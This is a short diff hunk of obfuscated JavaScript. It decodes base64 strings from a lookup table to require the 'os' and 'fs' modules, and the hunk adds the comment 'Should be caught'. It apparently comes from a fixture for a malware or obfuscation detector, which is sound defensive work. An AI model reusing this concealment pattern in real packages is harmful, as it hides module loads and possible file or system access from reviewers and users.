@@ -5,7 +5,7 @@
 
 const c = a2 => (
     s1 = a2[au(0x38)+'e'](0x1),           // slice(1)
-        Buffer[at(0x66)](s1, r)[aw(0x68)+au(0x4c)](t)  // Buffer.from(s1, 'base64').toString('utf8')
+        Buffer[at(0x66)](s1, r)[aw(0x68)+au(0x4c)](t)  // Buffer.from(s1, 'base64').toString('utf8')  // Should be caught
 );
 e = require(c(as(0x20))),   // "os"
     n = require(c(as(0x69))),    // "fs"
